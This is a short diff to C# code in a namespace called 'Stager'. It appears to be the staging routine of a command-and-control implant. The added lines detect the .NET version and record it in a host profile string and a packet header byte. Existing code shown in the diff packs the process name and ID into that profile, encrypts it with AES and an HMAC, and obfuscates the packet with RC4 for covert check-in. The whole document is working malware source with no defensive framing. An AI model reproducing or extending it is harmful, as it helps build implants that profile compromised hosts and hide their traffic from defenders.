@@ -182,17 +182,25 @@ namespace Stager
             }
 
             Process n = Process.GetCurrentProcess();
+            String version = Environment.Version.Major.ToString();
+            byte ver =0x04;
+            String language="dotnet45";
+            if(version.Equals("2"))
+            {
+                language="dotnet35";
+                ver =0x03;
+            }
+
             i += "|" + n.ProcessName + "|" + n.Id;
-            i += "|dotnet|" + Environment.Version.Major.ToString();
+            i += "|"+language+"|" + version;
 
             byte[] ib2 = e.GetBytes(i);
             byte[] eb2 = iv.Concat(aes.CreateEncryptor().TransformFinalBlock(ib2, 0, ib2.Length)).ToArray();
             hmac.Key = key;
             eb2 = eb2.Concat(hmac.ComputeHash(eb2).Take(10)).ToArray();
 
-
             byte[] iv2 = BitConverter.GetBytes(rd.Next(int.MaxValue));
-            byte[] data2 = id.Concat(new byte[] { 0x03, 0x03, 0x00, 0x00 }).Concat(BitConverter.GetBytes(eb2.Length)).ToArray();
+            byte[] data2 = id.Concat(new byte[] { ver, 0x03, 0x00, 0x00 }).Concat(BitConverter.GetBytes(eb2.Length)).ToArray();
             byte[] rc4p2 = ConvertToRC4ByteStream(iv2.Concat(skb).ToArray(), data2);
             rc4p2 = iv2.Concat(rc4p2).Concat(eb2).ToArray();
 
